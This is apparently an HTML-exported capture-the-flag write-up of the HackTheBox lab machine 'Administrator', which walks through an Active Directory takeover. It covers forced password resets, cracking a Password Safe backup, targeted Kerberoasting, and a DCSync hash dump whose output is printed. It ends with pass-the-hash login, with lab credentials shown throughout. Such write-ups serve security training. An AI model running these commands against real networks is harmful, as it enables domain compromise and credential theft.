<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Administrator</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="../../assets/css/writeups_style.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Administrator</h1><br/><p>Portscan</p><p></p><p>	<strong>nmap -sVC -p- --open -sS --min-rate 5000 -v -n --stats-every=5s -Pn -oN administrator_scan 10.10.11.42</strong></p><p></p><p>Grab data with bloodhound</p><p></p><p>	<strong>bloodhound-python -u olivia -d administrator.htb -c All -ns 10.10.11.42</strong></p><p></p><p><img src="images/184-1.png" alt="images/184-1.png" /></p><p></p><p>We can ForceChangePassword for user michael</p><p></p><p>	<strong>net rpc password &quot;michael&quot; &quot;newP@ssword2022&quot; -U &quot;administrator.htb&quot;/&quot;olivia&quot;%&quot;ichliebedich&quot; -S &quot;dc.administrator.htb&quot;</strong></p><p></p><p>	<strong>netexec smb 10.10.11.42 -u &quot;michael&quot; -p &quot;Admin1234@&quot;</strong></p><p></p><p><img src="images/184-2.png" alt="images/184-2.png" /></p><p></p><p>With Michael i can change benjamins Password</p><p></p><p><img src="images/184-3.png" alt="images/184-3.png" /></p><p></p><p>	<strong>net rpc password &quot;benjamin&quot; &quot;Admin1234@&quot; -U &quot;administrator.htb&quot;/&quot;michael&quot;%&quot;Admin1234@&quot; -S &quot;dc.administrator.htb&quot;</strong></p><p></p><p><img src="images/184-4.png" alt="images/184-4.png" /></p><p></p><p>I can access throught ftp with benjamin creds</p><p></p><p><img src="images/184-5.png" alt="images/184-5.png" /></p><p></p><p>There is a Backup file</p><p></p><p><img src="images/184-6.png" alt="images/184-6.png" /></p><p></p><p>I downloaded it with get command</p><p></p><p><img src="images/184-7.png" alt="images/184-7.png" /></p><p></p><p>I can turn this file on a john hash</p><p></p><p>	<strong>pwsafe2john Backup.psafe3 &gt; hash.txt</strong></p><p></p><p>Now we crack the hash with John The Ripper</p><p></p><p>	<strong>john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt</strong></p><p></p><p><img src="images/184-8.png" alt="images/184-8.png" /></p><p></p><p>I found 3 users with his passwords</p><p></p><p>alexander:UrkIbagoxMyUGw0aPlj9B0AXSea4Sw</p><p>emily:UXLCI5iETUsIBoFVTj8yQFKoHjXmb</p><p>emma:WwANQWnmJnGV07WQN8bMS7FMAbjNur</p><p></p><p>Only Emily can be used</p><p></p><p><img src="images/184-9.png" alt="images/184-9.png" /></p><p></p><p>Emily has Generic write permission over Nethan</p><p></p><p><img src="images/184-10.png" alt="images/184-10.png" /></p><p></p><p>I can use TargetKerberoast to attack </p><p></p><p>I have a problem with time sync so i make a <strong>sudo ntpdate 10.10.11.42</strong></p><p></p><p>I run the exploit and found a hash for ethan</p><p></p><p><img src="images/184-11.png" alt="images/184-11.png" /></p><p></p><p>With John we decrypt the hash</p><p></p><p>	<strong>john hash_ethan.hash --wordlist=/usr/share/wordlists/rockyou.txt --format=krb5tgs</strong></p><p></p><p><img src="images/184-12.png" alt="images/184-12.png" /></p><p></p><p>With Ethan we can perform a Dsync attack</p><p></p><p>I dump hashes with impaket</p><p></p><p>	<strong>impacket-secretsdump &#39;administrator.htb&#39;/&#39;ethan&#39;:&#39;limpbizkit&#39;@&#39;10.10.11.42&#39; </strong></p><p></p><p><code>Administrator:500:aad3b435b51404eeaad3b435b51404ee:3dc553ce4b9fd20bd016e098d2d2fd2e:::</code></p><p><code>Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</code></p><p><code>krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1181ba47d45fa2c76385a82409cbfaf6:::</code></p><p><code>administrator.htb\olivia:1108:aad3b435b51404eeaad3b435b51404ee:fbaa3e2294376dc0f5aeb6b41ffa52b7:::</code></p><p><code>administrator.htb\michael:1109:aad3b435b51404eeaad3b435b51404ee:fb54d1c05e301e024800c6ad99fe9b45:::</code></p><p><code>administrator.htb\benjamin:1110:aad3b435b51404eeaad3b435b51404ee:fb54d1c05e301e024800c6ad99fe9b45:::</code></p><p><code>administrator.htb\emily:1112:aad3b435b51404eeaad3b435b51404ee:eb200a2583a88ace2983ee5caa520f31:::</code></p><p><code>administrator.htb\ethan:1113:aad3b435b51404eeaad3b435b51404ee:5c2b9f97e0620c3d307de85a93179884:::</code></p><p><code>administrator.htb\alexander:3601:aad3b435b51404eeaad3b435b51404ee:cdc9e5f3b0631aa3600e0bfec00a0199:::</code></p><p><code>administrator.htb\emma:3602:aad3b435b51404eeaad3b435b51404ee:11ecd72c969a57c34c819b41b54455c9:::</code></p><p></p><p></p><p></p><p>Â With evilwirm we can connect to the target machine and obtain both flags</p><p></p><p>	<strong>evil-winrm -i 10.10.11.42 -u administrator -H 3dc553ce4b9fd20bd016e098d2d2fd2e</strong></p><p></p><p><img src="images/184-13.png" alt="images/184-13.png" /></p></div>
</body>
</html>
